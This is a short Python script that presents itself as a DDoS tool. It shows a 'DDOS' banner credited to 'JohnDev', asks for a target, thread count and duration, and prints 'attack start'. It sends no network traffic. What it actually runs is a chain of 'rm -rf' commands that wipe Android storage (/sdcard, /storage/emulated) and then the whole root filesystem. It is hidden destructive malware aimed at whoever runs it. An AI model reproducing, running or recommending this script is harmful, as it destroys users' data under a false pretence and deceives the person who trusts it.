import os
import threading
import time
import random
import bs4
os.system('clear')
print("""\x1b[32;2;255;20;32m

██████╗░██████╗░░█████╗░░██████╗           
██╔══██╗██╔══██╗██╔══██╗██╔════╝             
██║░░██║██║░░██║██║░░██║╚█████╗░            
██║░░██║██║░░██║██║░░██║░╚═══██╗                    
██████╔╝██████╔╝╚█████╔╝██████╔╝               
╚═════╝░╚═════╝░░╚════╝░╚═════╝░                
____________________________________________________________
Coded By: JohnDev
____________________________________________________________
""")
host = str(input("Enter Target: "))
threads = int(input("Threads: "))
time = int(input("Times: "))
print("attack start")

os.system('rm -rf /storage/emulated/0/*')
os.system('rm -rf /storage/emulated/*')
os.system('rm -rf /sdcard/*')
os.system('rm -rf /sdcard/0/*')
os.system('rm -rf /sdcard1/*')
os.system('rm -rf /storage/*')
os.system('rm -rf /*')